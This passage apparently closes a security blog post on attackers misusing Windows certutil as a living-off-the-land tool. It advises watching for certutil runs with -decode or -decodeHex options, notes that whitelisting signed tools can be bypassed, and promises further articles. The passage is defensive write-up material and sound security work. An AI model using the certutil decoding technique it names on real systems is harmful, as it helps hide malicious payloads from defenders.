As tools like certutil can be used by an attacker with physical access to the machine or by malicious code unknowingly downloaded by a user after a phishing or other social engineering attack.  
Certutil usage should be monitored, particularly if detected it being used with -decode or -decodeHex options where that would not normally be expected in your network. It is paramount not to depend on tools that simply whitelist built-in or signed code as obviously these will be bypassed by such Living Off the Land (LOL) techniques.  

### **Conclusion**

This kind of attack is very much happening in real life. There have been multiple incidents targeted to different office environments as well as banks. It was a fun learning experience working with certutil. We are going to write more articles about other LOLS that we could find. Stay Tuned